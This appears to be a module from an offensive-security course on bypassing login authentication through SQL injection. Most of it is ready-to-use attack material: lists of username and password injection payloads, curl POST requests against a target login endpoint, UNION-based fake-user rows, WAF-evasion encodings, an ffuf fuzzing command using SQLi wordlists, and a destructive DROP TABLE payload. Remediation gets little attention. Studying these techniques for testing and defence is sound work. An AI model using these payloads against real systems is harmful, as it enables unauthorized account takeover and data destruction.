# Authentication Bypass

## Unit 5: SQL Injection — Topic 5

## 🎯 Overview

SQL injection in login forms allows attackers to bypass authentication without knowing valid credentials. This is one of the most critical impacts of SQLi — it grants immediate unauthorized access to the application. This topic covers common bypass techniques for different authentication implementations.

---

## 1. Classic Authentication Bypass

```
┌──────────────────────────────────────────────────────────────┐
│              HOW AUTH BYPASS WORKS                             │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Backend code:                                               │
│  SELECT * FROM users WHERE username='[input]'                │
│    AND password='[input]'                                    │
│                                                              │
│  If query returns a row → login successful                   │
│  If no rows → login failed                                   │
│                                                              │
│  Injection: username = admin' --                             │
│                                                              │
│  Resulting query:                                            │
│  SELECT * FROM users WHERE username='admin' -- '             │
│    AND password='anything'                                   │
│              ↑ comment ignores rest                          │
│                                                              │
│  Query becomes: SELECT * FROM users WHERE username='admin'   │
│  → Returns admin row → Login as admin!                       │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Common Bypass Payloads

### Username Field Payloads

```
admin'--
admin' #
admin'/*
admin' OR 1=1--
admin' OR '1'='1'--
admin' OR '1'='1
' OR 1=1--
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--
admin') OR ('1'='1
```

### Password Field Payloads

```
' OR 1=1--
' OR '1'='1
anything' OR '1'='1'--
x' OR 1=1#
') OR ('1'='1
```

### Both Fields

```
Username: ' OR 1=1--
Password: anything

Username: admin'--
Password: anything

Username: ' OR 1=1 LIMIT 1--
Password: anything

Username: admin
Password: ' OR '1'='1
```

---

## 3. Bypass Techniques by Context

### Numeric ID Authentication

```sql
-- Original: SELECT * FROM users WHERE user_id = [input]
-- Bypass:
0 OR 1=1--
1 OR 1=1--
1; DROP TABLE users--
```

### Parenthesized Queries

```sql
-- Original: SELECT * FROM users WHERE (username='[input]') 
--   AND (password='[input]')
-- Bypass:
Username: admin')--
Username: ') OR ('1'='1
Username: ') OR 1=1--
```

### WHERE Clause with AND/OR

```sql
-- Original: SELECT * FROM users WHERE username='[input]' 
--   AND password='[input]' AND active=1
-- Bypass:
Username: admin' AND active=1--
-- Resulting: WHERE username='admin' AND active=1-- ' 
--   AND password='' AND active=1
```

---

## 4. Advanced Bypass Techniques

### Login as Specific User

```bash
# Login as first user in database
curl -X POST https://target.com/login \
  -d "username=' OR 1=1 LIMIT 1--&password=x"

# Login as admin (by name)
curl -X POST https://target.com/login \
  -d "username=admin'--&password=x"

# Login as admin (by role)
curl -X POST https://target.com/login \
  -d "username=' OR role='admin'--&password=x"

# Login as second user
curl -X POST https://target.com/login \
  -d "username=' OR 1=1 LIMIT 1,1--&password=x"
```

### Bypassing Hash Comparison

```sql
-- If app does: SELECT * FROM users WHERE username='input'
-- Then compares password hash in code:
-- if (bcrypt.compare(input_pass, db_hash)) → login

-- SQLi in username field works because password check
-- happens AFTER the query returns a row

-- But if app does:
-- SELECT * FROM users WHERE username='input' 
--   AND password=MD5('input')
-- Then bypass the hash:
Username: admin'--
-- Password check is commented out!
```

### UNION-Based Authentication Bypass

```sql
-- Create a fake user row using UNION
-- Original: SELECT id, username, role FROM users 
--   WHERE username='input' AND password='input'

-- Injection:
Username: ' UNION SELECT 1,'admin','admin'--
-- Returns fabricated row with admin access
-- The application processes this fake result as a valid user!

-- For different column counts:
' UNION SELECT 1,'admin','admin','fakehash',1--
```

---

## 5. WAF Bypass for Auth SQLi

```bash
# URL encoding
username=admin%27--%20&password=x

# Double URL encoding
username=admin%2527--%2520&password=x

# Case variation
username=admin' OR 1=1--&password=x
username=admin' oR 1=1--&password=x

# Comment insertion
username=admin'/**/OR/**/1=1--&password=x

# Alternative comments
username=admin'/*!OR*/1=1--&password=x

# Null byte
username=admin'%00--&password=x

# Tab/newline instead of space
username=admin'%09OR%091=1--&password=x
username=admin'%0aOR%0a1=1--&password=x
```

---

## 6. Testing Authentication Bypass

```bash
# Automated testing with Burp Intruder
# 1. Capture login request
# 2. Set username as payload position
# 3. Load SQLi auth bypass payload list
# 4. Run attack
# 5. Sort by response length/status code
# 6. Different response = potential bypass

# Using ffuf
ffuf -u https://target.com/login \
  -X POST -d "username=FUZZ&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  -fr "Invalid" -mc 200,302

# SecLists auth bypass wordlists:
# /Fuzzing/SQLi/Generic-SQLi.txt
# /Fuzzing/SQLi/quick-SQLi.txt
# /Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
```

---

## 📊 Summary Table

| Technique | Payload | Works When |
|-----------|---------|-----------|
| Comment out password | `admin'--` | Password check in SQL |
| OR true condition | `' OR 1=1--` | Login any user |
| UNION fake row | `' UNION SELECT 1,'admin'--` | App trusts query result |
| Specific user | `admin' AND role='admin'--` | Need admin access |
| Parenthesis escape | `') OR ('1'='1` | Parenthesized queries |

---

## ❓ Revision Questions

1. How does the classic `admin'--` bypass work?
2. What is the difference between commenting and OR-based bypass?
3. How can UNION SELECT create a fake user for authentication?
4. Why might `' OR 1=1--` log in as an unexpected user?
5. How do you bypass authentication when the query uses parentheses?
6. What WAF evasion techniques apply to authentication bypass payloads?

---

*Previous: [04-data-extraction.md](04-data-extraction.md) | Next: [06-automated-tools-sqlmap.md](06-automated-tools-sqlmap.md)*

---

*[Back to README](../README.md)*
